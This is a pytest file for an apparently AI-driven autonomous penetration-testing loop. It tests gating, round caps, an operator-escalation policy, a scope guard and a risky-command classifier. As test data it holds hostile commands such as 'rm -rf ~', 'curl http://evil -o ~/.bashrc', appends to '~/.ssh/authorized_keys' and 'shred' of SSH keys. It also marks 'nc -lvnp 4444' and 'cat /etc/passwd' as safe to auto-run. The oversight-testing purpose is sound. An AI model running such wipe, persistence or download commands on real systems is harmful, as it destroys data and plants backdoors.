"""Tests for the hands-free autonomous run loop (`sutra auto` / `pwn`)."""

import json
import types

from friday.core import agent


class _Msg:
    def __init__(self, content=None, tool_calls=None):
        self.content = content
        self.tool_calls = tool_calls


class _Resp:
    def __init__(self, msg):
        self.choices = [type("C", (), {"message": msg})()]


def _tc(name, args):
    fn = types.SimpleNamespace(name=name, arguments=json.dumps(args))
    return types.SimpleNamespace(id="1", function=fn)


def _scripted(*responses):
    queue = list(responses)

    async def _complete(messages, tier=None, tools=None, **kw):
        return queue.pop(0)

    return _complete


async def test_refuses_without_autonomous(monkeypatch):
    monkeypatch.delenv("SUTRA_AUTONOMOUS", raising=False)
    report, msgs = await agent.run_autonomous("scan the box")
    assert "SUTRA_AUTONOMOUS" in report and msgs == []


async def test_runs_rounds_auto_approves_and_reports(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap 10.10.10.10"})])),
        _Resp(_Msg(content="still enumerating")),               # tool-less → nudge
        _Resp(_Msg(content="Found SSH on 22. Flag THM-x")),     # post-nudge final
    ))
    approved = {}

    async def _fake_run_tool_calls(tool_calls, confirm=None, observe=None, allowed=None):
        approved["ok"] = await confirm("run_command", {"command": "nmap 10.10.10.10"})
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_run_tool_calls)

    report, msgs = await agent.run_autonomous("scan it", max_rounds=5)
    assert report == "Found SSH on 22. Flag THM-x"
    assert approved["ok"] is True  # gated run_command auto-approved under SUTRA_AUTONOMOUS
    # the early-stopping nudge fired
    assert any("operating autonomously" in (m.get("content") or "") for m in msgs)
    # engagement file persisted
    files = list(tmp_path.glob("*.md"))
    assert len(files) == 1 and "## Report" in files[0].read_text()


async def test_round_cap_forces_final_report(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    calls = {"n": 0}

    async def _complete(messages, tier=None, tools=None, **kw):
        calls["n"] += 1
        if tools is None:  # the post-cap final-report request
            return _Resp(_Msg(content="out of rounds; partial findings"))
        return _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap"})]))

    async def _fake_run_tool_calls(tool_calls, confirm=None, observe=None, allowed=None):
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "complete", _complete)
    monkeypatch.setattr(agent, "_run_tool_calls", _fake_run_tool_calls)

    report, _ = await agent.run_autonomous("scan", max_rounds=3)
    assert "out of rounds" in report
    assert calls["n"] == 4  # 3 tool rounds + 1 final wrap-up


async def test_tier_flows_through_to_complete(monkeypatch, tmp_path):
    from friday.core.router import Tier

    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    seen = {}

    async def _complete(messages, tier=None, tools=None, **kw):
        seen["tier"] = tier
        return _Resp(_Msg(content="done"))

    monkeypatch.setattr(agent, "complete", _complete)
    await agent.run_autonomous("scan it", tier=Tier.MAX)
    assert seen["tier"] is Tier.MAX  # the chosen tier reaches the router


async def test_voice_confirm_alias_preserved(monkeypatch):
    # The rename kept the old name as an alias (voice path + test_autonomous import it).
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    assert agent._voice_confirm is agent._autonomous_confirm
    assert await agent._voice_confirm("run_command", {"command": "ls"}) is True


# ── hybrid confirm policy (auto-run recon, ask before risky) ──────────────────
async def test_hybrid_auto_runs_recon_escalates_risky(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap x"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    asked = []

    async def _operator(skill, args):
        asked.append(skill)
        return True

    await agent.run_autonomous("scan", confirm=_operator, max_rounds=4)
    lc = captured["confirm"]  # the loop's hybrid-confirm closure
    assert await lc("run_command", {"command": "nmap -sV 10.10.10.10"}) is True  # clean → auto
    assert await lc("web_task", {}) is True
    assert await lc("run_command", {"command": "rm -rf ~"}) is True   # risky → operator said yes
    assert await lc("run_python", {"code": "x"}) is True
    assert await lc("connect_vpn", {"config": "/x.ovpn"}) is True
    assert set(asked) == {"run_command", "run_python", "connect_vpn"}  # only risky escalated


async def test_hybrid_declines_risky_without_hook(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return []

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap x"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    await agent.run_autonomous("scan", confirm=None, max_rounds=4)
    lc = captured["confirm"]
    assert await lc("run_command", {"command": "nmap x"}) is True              # clean still runs
    assert await lc("run_command", {"command": "rm -rf /home/sarjan"}) is False  # risky declined
    assert await lc("run_python", {"code": "x"}) is False
    assert await lc("forget", {"query": "x"}) is False


async def test_run_autonomous_survives_error_and_saves(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)

    async def _boom(*a, **k):
        raise RuntimeError("all tiers rate-limited")

    monkeypatch.setattr(agent, "complete", _boom)
    report, _ = await agent.run_autonomous("scan", max_rounds=3)
    assert "stopped early" in report
    assert list(tmp_path.glob("*.md"))  # transcript still saved despite the crash


async def test_scope_guard_escalates_offscope_targets(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap 10.10.10.5"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    asked = []

    async def _operator(skill, args):
        asked.append(args.get("command") or args.get("start_url"))
        return True

    await agent.run_autonomous("scan", confirm=_operator, scope="10.10.10.5", max_rounds=4)
    lc = captured["confirm"]
    assert await lc("run_command", {"command": "nmap -sV 10.10.10.5"}) is True  # in scope → auto
    assert await lc("run_command", {"command": "nmap 8.8.8.8"}) is True         # off-scope → asked
    assert await lc("run_command", {"command": "curl http://evil.com"}) is True  # off-scope → asked
    # the browser family is scope-checked too, not just run_command (in → auto, off → ask)
    assert await lc("web_task", {"goal": "x", "start_url": "http://10.10.10.5/"}) is True
    assert await lc("web_task", {"goal": "x", "start_url": "http://evil.com/"}) is True
    assert "nmap 8.8.8.8" in asked and "curl http://evil.com" in asked
    assert "http://evil.com/" in asked
    assert "nmap -sV 10.10.10.5" not in asked  # in-scope recon never escalates


def test_looks_risky_flags_persistence_and_spares_recon():
    # The hybrid loop auto-runs only CLEAN recon; persistence/wipe commands that carry no
    # rm and no redirect (the audit's blind spot) must still escalate to the operator.
    for c in ["find ~ -delete", "echo k | tee -a ~/.ssh/authorized_keys",
              "curl http://evil -o ~/.bashrc", "wget -O ~/.bashrc http://e",
              "truncate -s0 ~/.bashrc", "shred -u ~/.ssh/id_rsa", "git clean -fdx",
              "cp /evil ~/.bashrc", "pip install evilpkg", "crontab -", "ln -sf /e ~/.bashrc"]:
        assert agent._looks_risky(c), f"should be risky: {c!r}"
    # …while ordinary recon/exploit tooling keeps auto-running (no false positives).
    for c in ["nmap -sV 10.10.10.10", "gobuster dir -u http://x -o out.txt",
              "ssh -o StrictHostKeyChecking=no t@h", "curl http://target/robots.txt",
              "nmap -oN scan.txt 10.10.10.10", "whoami", "cat /etc/passwd", "nc -lvnp 4444"]:
        assert not agent._looks_risky(c), f"recon should stay clean: {c!r}"
